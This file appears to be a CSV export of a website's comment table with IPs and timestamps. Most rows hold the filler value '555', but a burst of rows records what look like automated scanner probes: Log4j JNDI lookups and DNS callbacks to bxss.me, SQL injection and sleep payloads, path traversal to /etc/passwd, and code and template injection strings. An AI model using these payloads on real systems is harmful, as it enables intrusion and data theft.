pro_id,user_id,comment_id,ip,status,comment,date_comment
186,529,415,162.222.89.251,1,555,2022-08-15 22:16:05
186,529,416,162.222.89.251,1,555,2022-08-15 22:16:06
186,529,417,162.222.89.251,1,555,2022-08-15 22:16:06
186,529,418,162.222.89.251,1,555,2022-08-15 22:16:06
186,529,419,162.222.89.251,1,555,2022-08-15 22:16:07
186,529,420,162.222.89.251,1,555,2022-08-15 22:16:07
186,529,421,162.222.89.251,1,555,2022-08-15 22:16:12
186,529,422,162.222.89.251,1,555,2022-08-15 22:16:12
186,529,423,162.222.89.251,1,555,2022-08-15 22:16:15
186,529,424,162.222.89.251,1,555,2022-08-15 22:16:16
186,529,425,162.222.89.251,1,555,2022-08-15 22:16:17
186,529,426,162.222.89.251,1,555,2022-08-15 22:16:18
352,529,427,162.222.89.251,1,555,2022-08-16 02:54:37
352,529,428,162.222.89.251,1,555,2022-08-16 02:54:47
352,529,429,162.222.89.251,1,555,2022-08-16 02:54:47
352,529,430,162.222.89.251,1,${j${::-n}di:dns${::-:}//hitmlwvwciehv35316${::-.}bxss.me}zzzz,2022-08-16 02:54:48
352,529,431,162.222.89.251,1,response.write(9806288*9770313),2022-08-16 02:54:49
352,529,432,162.222.89.251,1,r9fHOfEG,2022-08-16 02:54:50
352,529,433,162.222.89.251,1,${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j.009247.1708-32439.1708.879f4${::-.}1${::-.}bxss.me}},2022-08-16 02:54:50
352,529,434,162.222.89.251,1,"+response.write(9806288*9770313)+",2022-08-16 02:54:50
0,529,435,162.222.89.251,1,555,2022-08-16 02:54:51
352,529,436,162.222.89.251,1,-1 OR 2+685-685-1=0+0+0+1 -- ,2022-08-16 02:54:51
0,529,437,162.222.89.251,1,555,2022-08-16 02:54:51
352,529,438,162.222.89.251,1,-1 OR 2+33-33-1=0+0+0+1,2022-08-16 02:54:51
352,529,439,162.222.89.251,1,555,2022-08-16 02:54:51
352,529,440,162.222.89.251,1,555,2022-08-16 02:54:51
352,529,441,162.222.89.251,1,555,2022-08-16 02:54:52
352,529,442,162.222.89.251,1,1,2022-08-16 02:54:52
352,529,443,162.222.89.251,1,"-1"" OR 2+924-924-1=0+0+0+1 -- ",2022-08-16 02:54:53
352,529,444,162.222.89.251,1,555,2022-08-16 02:54:53
352,529,445,162.222.89.251,1,555,2022-08-16 02:54:53
352,529,446,162.222.89.251,1,"if(now()=sysdate(),sleep(15),0)",2022-08-16 02:54:53
352,529,447,162.222.89.251,1,555,2022-08-16 02:54:53
352,529,448,162.222.89.251,1,0,2022-08-16 02:54:54
352,529,449,162.222.89.251,1,../../../../../../../../../../../../../../etc/passwd,2022-08-16 02:55:09
352,529,450,162.222.89.251,1,FEajc14m,2022-08-16 02:55:09
352,529,451,162.222.89.251,1,../../../../../../../../../../../../../../windows/win.ini,2022-08-16 02:55:10
352,529,452,162.222.89.251,1,<blank>,2022-08-16 02:55:10
352,529,453,162.222.89.251,1,555,2022-08-16 02:55:10
352,529,454,162.222.89.251,1,0,2022-08-16 02:55:10
352,529,455,162.222.89.251,1,../555,2022-08-16 02:55:16
352,529,456,162.222.89.251,1,<blank>,2022-08-16 02:55:16
352,529,457,162.222.89.251,1,555,2022-08-16 02:55:16
352,529,458,162.222.89.251,1,"555<esi:include src=""http://bxss.me/rpb.png""/>",2022-08-16 02:55:17
352,529,459,162.222.89.251,1,${10000307+9999243},2022-08-16 02:55:17
352,529,460,162.222.89.251,1,0,2022-08-16 02:55:17
352,529,461,162.222.89.251,1,555,2022-08-16 02:55:17
352,529,462,162.222.89.251,1,555,2022-08-16 02:55:18
352,529,463,162.222.89.251,1,555,2022-08-16 02:55:18
352,529,464,162.222.89.251,1,555,2022-08-16 02:55:18
352,529,465,162.222.89.251,1,http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg,2022-08-16 02:55:18
352,529,466,162.222.89.251,1,555,2022-08-16 02:55:18
352,529,467,162.222.89.251,1,555,2022-08-16 02:55:18
352,529,468,162.222.89.251,1,555,2022-08-16 02:55:19
352,529,469,162.222.89.251,1,1some_inexistent_file_with_long_name\x00.jpg,2022-08-16 02:55:19
352,529,470,162.222.89.251,1,0,2022-08-16 02:55:19
352,529,471,162.222.89.251,1,555&n968257=v921001,2022-08-16 02:55:22
352,529,472,162.222.89.251,1,555,2022-08-16 02:55:22
352,529,473,162.222.89.251,1,Http://bxss.me/t/fit.txt,2022-08-16 02:55:22
352,529,474,162.222.89.251,1,),2022-08-16 02:55:22
352,529,475,162.222.89.251,1,!(()&&!|*|*|,2022-08-16 02:55:22
352,529,476,162.222.89.251,1,555,2022-08-16 02:55:22
352,529,477,162.222.89.251,1,^(#$!@#$)(()))******,2022-08-16 02:55:23
352,529,478,162.222.89.251,1,555,2022-08-16 02:55:23
352,529,479,162.222.89.251,1,555,2022-08-16 02:55:23
352,529,480,162.222.89.251,1,0,2022-08-16 02:55:23
352,529,481,162.222.89.251,1,<blank>,2022-08-16 02:55:38
352,529,482,162.222.89.251,1,555,2022-08-16 02:55:38
352,529,483,162.222.89.251,1,http://bxss.me/t/fit.txt?.jpg,2022-08-16 02:55:38
352,529,484,162.222.89.251,1,555,2022-08-16 02:55:38
352,529,485,162.222.89.251,1,bxss.me,2022-08-16 02:55:38
352,529,486,162.222.89.251,1,".gethostbyname(lc("hitzt"."fkftuadkbd682.bxss.me."))."A".chr(67).chr(hex("58")).chr(113).chr(75).chr(99).chr(82).",2022-08-16 02:55:38
352,529,487,162.222.89.251,1,555,2022-08-16 02:55:39
352,529,488,162.222.89.251,1,0,2022-08-16 02:55:39
352,529,489,162.222.89.251,1,555,2022-08-16 02:55:39
352,529,490,162.222.89.251,1,555,2022-08-16 02:55:39
352,529,491,162.222.89.251,1,555,2022-08-16 02:55:40
352,529,492,162.222.89.251,1,555,2022-08-16 02:55:40
352,529,493,162.222.89.251,1,555,2022-08-16 02:55:40
352,529,494,162.222.89.251,1,555,2022-08-16 02:55:41
352,529,495,162.222.89.251,1,555,2022-08-16 02:55:41
352,529,496,162.222.89.251,1,0,2022-08-16 02:55:41
352,529,497,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,498,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,499,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,500,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,501,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,502,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,503,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,504,162.222.89.251,1,555,2022-08-16 02:55:47
352,529,505,162.222.89.251,1,0,2022-08-16 02:55:47
352,529,506,162.222.89.251,1,555,2022-08-16 02:56:12
352,529,507,162.222.89.251,1,555,2022-08-16 02:56:12
352,529,508,162.222.89.251,1,555,2022-08-16 02:56:12
352,529,509,162.222.89.251,1,"+"A".concat(70-3).concat(22*4).concat(119).concat(82).concat(106).concat(76)+(require"socket"\nSocket.gethostbyname("hitus"+"eiycefwsd52fc.bxss.me.")[3].to_s)+",2022-08-16 02:56:12
352,529,510,162.222.89.251,1,";print(md5(31337));$a=",2022-08-16 02:56:12
352,529,511,162.222.89.251,1,HttP://bxss.me/t/xss.html?\x00,2022-08-16 02:56:12
352,529,512,162.222.89.251,1,555,2022-08-16 02:56:13
352,529,513,162.222.89.251,1,555,2022-08-16 02:56:13
352,529,514,162.222.89.251,1,${@print(md5(31337))},2022-08-16 02:56:13
352,529,515,162.222.89.251,1,bxss.me/t/xss.html?\x00,2022-08-16 02:56:13
352,529,516,162.222.89.251,1,555,2022-08-16 02:56:13
352,529,517,162.222.89.251,1,555,2022-08-16 02:56:13
352,529,518,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,519,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,520,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,521,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,522,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,523,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,524,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,525,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,526,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,527,162.222.89.251,1,555,2022-08-16 02:56:14
0,529,528,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,529,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,530,162.222.89.251,1,555,2022-08-16 02:56:14
352,529,531,162.222.89.251,1,555,2022-08-16 02:56:15
352,529,532,162.222.89.251,1,555,2022-08-16 02:56:15
352,529,533,162.222.89.251,1,555,2022-08-16 02:56:15
0,529,534,162.222.89.251,1,555,2022-08-16 02:56:15
352,529,535,162.222.89.251,1,insert_comment.php,2022-08-16 02:56:15
352,529,536,162.222.89.251,1,/xfs.bxss.me,2022-08-16 02:56:15
352,529,537,162.222.89.251,1,555,2022-08-16 02:56:15
352,529,538,162.222.89.251,1,insert_comment.php\x00,2022-08-16 02:56:15
352,529,539,162.222.89.251,1,555,2022-08-16 02:56:15
352,529,540,162.222.89.251,1,))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))),2022-08-16 02:56:15
352,529,541,162.222.89.251,1,insert_comment.php/.,2022-08-16 02:56:16
352,529,542,162.222.89.251,1,555,2022-08-16 02:56:16
352,529,543,162.222.89.251,1,555,2022-08-16 02:56:16
352,529,544,162.222.89.251,1,555,2022-08-16 02:56:16
352,529,545,162.222.89.251,1,555,2022-08-16 02:56:16
352,529,546,162.222.89.251,1,555,2022-08-16 02:56:16
352,529,547,162.222.89.251,1,5559782543,2022-08-16 02:56:16
352,529,548,162.222.89.251,1,<!--,2022-08-16 02:56:16
352,529,549,162.222.89.251,1,555,2022-08-16 02:56:17
352,529,550,162.222.89.251,1,555,2022-08-16 02:56:17
352,529,551,162.222.89.251,1,555,2022-08-16 02:56:17
1,529,552,162.222.89.251,1,555,2022-08-16 02:56:17
352,529,553,162.222.89.251,1,555,2022-08-16 02:56:17
0,529,554,162.222.89.251,1,555,2022-08-16 02:56:17
352,529,555,162.222.89.251,1,555,2022-08-16 02:56:17
352,529,556,162.222.89.251,1,555,2022-08-16 02:56:17
352,529,557,162.222.89.251,1,555,2022-08-16 02:56:18
2147483647,529,558,162.222.89.251,1,555,2022-08-16 02:56:18
352,529,559,162.222.89.251,1,555,2022-08-16 02:56:18
352,529,560,162.222.89.251,1,555,2022-08-16 02:56:18
352,529,561,162.222.89.251,1,555,2022-08-16 02:56:18
352,529,562,162.222.89.251,1,555,2022-08-16 02:56:18
352,529,563,162.222.89.251,1,555,2022-08-16 02:56:19
352,529,564,162.222.89.251,1,555,2022-08-16 02:56:19
0,529,565,162.222.89.251,1,555,2022-08-16 02:56:19
352,529,566,162.222.89.251,1,555,2022-08-16 02:56:34
352,529,567,162.222.89.251,1,555,2022-08-16 02:56:34
352,529,568,162.222.89.251,1,555,2022-08-16 02:56:34
352,529,569,162.222.89.251,1,555,2022-08-16 02:56:34
352,529,570,162.222.89.251,1,555,2022-08-16 02:56:34
352,529,571,162.222.89.251,1,555,2022-08-16 02:56:34
352,529,572,162.222.89.251,1,555,2022-08-16 02:56:34
352,529,573,162.222.89.251,1,555,2022-08-16 02:56:35
352,529,574,162.222.89.251,1,555,2022-08-16 02:56:35
352,529,575,162.222.89.251,1,555,2022-08-16 02:56:35
0,529,576,162.222.89.251,1,555,2022-08-16 02:56:35
352,529,577,162.222.89.251,1,555,2022-08-16 02:56:50
352,529,578,162.222.89.251,1,555,2022-08-16 02:56:50
352,529,579,162.222.89.251,1,555,2022-08-16 02:56:50
0,529,580,162.222.89.251,1,555,2022-08-16 02:56:50
352,529,581,162.222.89.251,1,555,2022-08-16 02:56:53
352,529,582,162.222.89.251,1,555,2022-08-16 02:56:53
352,529,583,162.222.89.251,1,555,2022-08-16 02:56:54
352,529,584,162.222.89.251,1,555,2022-08-16 02:56:54
0,529,585,162.222.89.251,1,555,2022-08-16 02:56:54
352,529,586,162.222.89.251,1,555,2022-08-16 02:57:00
352,529,587,162.222.89.251,1,555,2022-08-16 02:57:00
352,529,588,162.222.89.251,1,555,2022-08-16 02:57:01
352,529,589,162.222.89.251,1,555,2022-08-16 02:57:01
352,529,590,162.222.89.251,1,555,2022-08-16 02:57:02
0,529,591,162.222.89.251,1,555,2022-08-16 02:57:02
352,529,592,162.222.89.251,1,555,2022-08-16 02:57:03
352,529,593,162.222.89.251,1,555,2022-08-16 02:57:03
0,529,594,162.222.89.251,1,555,2022-08-16 02:57:03
352,529,595,162.222.89.251,1,555,2022-08-16 02:57:04
352,529,596,162.222.89.251,1,555,2022-08-16 02:57:04
0,529,597,162.222.89.251,1,555,2022-08-16 02:57:04
352,529,598,162.222.89.251,1,555,2022-08-16 02:57:10
0,529,599,162.222.89.251,1,555,2022-08-16 02:57:11
352,529,600,162.222.89.251,1,555,2022-08-16 02:57:36
352,529,601,162.222.89.251,1,555,2022-08-16 02:57:36
352,529,602,162.222.89.251,1,555,2022-08-16 02:57:37
352,529,603,162.222.89.251,1,555,2022-08-16 02:57:37
352,529,604,162.222.89.251,1,555,2022-08-16 02:57:37
352,529,605,162.222.89.251,1,555,2022-08-16 02:57:38
352,529,606,162.222.89.251,1,555,2022-08-16 02:57:38
352,529,607,162.222.89.251,1,555,2022-08-16 02:57:38
352,529,608,162.222.89.251,1,555,2022-08-16 02:57:39
352,529,609,162.222.89.251,1,555,2022-08-16 02:57:39
352,529,610,162.222.89.251,1,555,2022-08-16 02:57:39
352,529,611,162.222.89.251,1,555,2022-08-16 02:57:40
352,529,612,162.222.89.251,1,555,2022-08-16 02:57:40
352,529,613,162.222.89.251,1,555,2022-08-16 02:57:40
352,529,614,162.222.89.251,1,555,2022-08-16 02:57:41
352,529,615,162.222.89.251,1,555,2022-08-16 02:57:41
352,529,616,162.222.89.251,1,555,2022-08-16 02:57:41
352,529,617,162.222.89.251,1,555,2022-08-16 02:57:42
352,529,618,162.222.89.251,1,555,2022-08-16 02:57:43
352,529,619,162.222.89.251,1,555,2022-08-16 02:57:44
352,529,620,162.222.89.251,1,555,2022-08-16 02:57:45
352,529,621,162.222.89.251,1,555,2022-08-16 02:57:46
352,529,622,162.222.89.251,1,555,2022-08-16 02:57:47
352,529,623,162.222.89.251,1,555,2022-08-16 02:57:49
352,529,624,162.222.89.251,1,555,2022-08-16 02:57:51
352,529,625,162.222.89.251,1,555,2022-08-16 02:57:52
352,529,626,162.222.89.251,1,555,2022-08-16 02:57:53
352,529,627,162.222.89.251,1,555,2022-08-16 02:57:54
352,529,628,162.222.89.251,1,555,2022-08-16 02:57:55
352,529,629,162.222.89.251,1,555,2022-08-16 02:57:56
352,529,630,162.222.89.251,1,555,2022-08-16 02:57:56
352,529,631,162.222.89.251,1,555,2022-08-16 02:57:57
352,529,632,162.222.89.251,1,555,2022-08-16 02:57:58
352,899,633,162.222.89.251,1,555,2022-08-16 07:07:08
186,899,634,162.222.89.251,1,555,2022-08-16 07:07:08
1,899,635,162.222.89.251,1,555,2022-08-16 07:07:08

